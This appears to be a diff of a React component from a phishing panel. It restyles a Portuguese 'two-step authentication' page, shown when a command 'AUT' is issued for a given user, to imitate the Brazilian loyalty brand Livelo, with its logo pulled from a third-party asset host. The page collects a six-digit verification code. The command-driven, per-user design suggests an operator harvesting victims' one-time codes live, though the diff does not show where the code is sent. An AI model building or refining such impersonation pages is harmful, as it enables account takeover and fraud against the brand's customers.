@@ -64,30 +64,156 @@ function CommandPage({ userId }) {
     );
   }
 
-  // Página de código 2FA
+  // Página de código 2FA (Autenticação de Duas Etapas)
   if (currentCommand?.action === "AUT") {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
-        <div className="max-w-md w-full">
-          <h1 className="text-2xl font-bold text-gray-900 mb-6 text-center">Código de Verificação</h1>
-          <p className="text-gray-600 mb-6 text-center">Digite o código de 6 dígitos que enviamos para você</p>
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <input
-              type="text"
-              value={inputValue}
-              onChange={(e) => setInputValue(e.target.value)}
-              placeholder="000000"
-              maxLength="6"
-              className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg text-center text-2xl font-bold tracking-widest focus:border-pink-500 focus:outline-none"
+      <div className="min-h-screen bg-white flex flex-col font-inter">
+        <div className="flex-1 flex flex-col items-center pt-16 px-4">
+          {/* Logo Livelo */}
+          <div className="mb-8">
+            <img 
+              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
+              alt="Livelo Logo" 
+              className="h-10 w-auto"
             />
+          </div>
+
+          {/* Ícone de Segurança */}
+          <div className="mb-6">
+            <div className="w-20 h-20 bg-gradient-to-br from-pink-100 to-purple-100 rounded-full flex items-center justify-center">
+              <svg 
+                className="w-10 h-10 text-pink-500" 
+                fill="none" 
+                stroke="currentColor" 
+                viewBox="0 0 24 24"
+              >
+                <path 
+                  strokeLinecap="round" 
+                  strokeLinejoin="round" 
+                  strokeWidth={2} 
+                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" 
+                />
+              </svg>
+            </div>
+          </div>
+
+          {/* Título */}
+          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
+            Autenticação de Duas Etapas
+          </h1>
+
+          {/* Descrição */}
+          <p className="text-gray-600 mb-8 text-center max-w-sm">
+            Digite o código do seu aplicativo autenticador ou o código de verificação que enviamos para você.
+          </p>
+
+          {/* Formulário */}
+          <form onSubmit={handleSubmit} className="w-full max-w-md space-y-6">
+            {/* Campo de código */}
+            <div className="relative">
+              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
+                <svg 
+                  xmlns="http://www.w3.org/2000/svg" 
+                  className="h-5 w-5" 
+                  fill="none" 
+                  viewBox="0 0 24 24" 
+                  stroke="currentColor"
+                >
+                  <path 
+                    strokeLinecap="round" 
+                    strokeLinejoin="round" 
+                    strokeWidth={2} 
+                    d="M7 20l4-16m2 16l4-16M6 9h14M4 15h14" 
+                  />
+                </svg>
+              </div>
+              <input
+                type="text"
+                value={inputValue}
+                onChange={(e) => {
+                  const value = e.target.value.replace(/\D/g, '');
+                  if (value.length <= 6) {
+                    setInputValue(value);
+                  }
+                }}
+                placeholder="Digite o código de 6 dígitos"
+                maxLength="6"
+                className="w-full pl-12 pr-4 py-3.5 border border-gray-900 rounded-lg text-center text-xl font-semibold tracking-widest focus:outline-none focus:border-pink-500 transition-colors"
+              />
+            </div>
+
+            {/* Botão Confirmar */}
             <button
               type="submit"
               disabled={loading || inputValue.length !== 6}
-              className="w-full bg-pink-500 hover:bg-pink-600 disabled:bg-gray-300 text-white py-3 rounded-full font-semibold transition-colors"
+              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
+                inputValue.length === 6
+                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
+                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
+              }`}
             >
-              {loading ? "Verificando..." : "Confirmar"}
+              {loading ? (
+                <div className="flex items-center justify-center">
+                  <svg
+                    className="animate-spin h-5 w-5 text-white"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                  >
+                    <circle
+                      className="opacity-25"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      strokeWidth="4"
+                    ></circle>
+                    <path
+                      className="opacity-75"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                    ></path>
+                  </svg>
+                </div>
+              ) : (
+                "Confirmar"
+              )}
             </button>
+
+            {/* Link de ajuda */}
+            <div className="text-center pt-2">
+              <a
+                href="#"
+                className="text-pink-500 hover:text-pink-600 text-sm transition-colors underline"
+              >
+                Não recebeu o código?
+              </a>
+            </div>
           </form>
+        </div>
+
+        {/* Voltar */}
+        <div className="p-8">
+          <a
+            href="#"
+            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              className="h-4 w-4 mr-2"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                strokeWidth={2}
+                d="M15 19l-7-7 7-7"
+              />
+            </svg>
+            Voltar para página inicial
+          </a>
         </div>
       </div>
     );
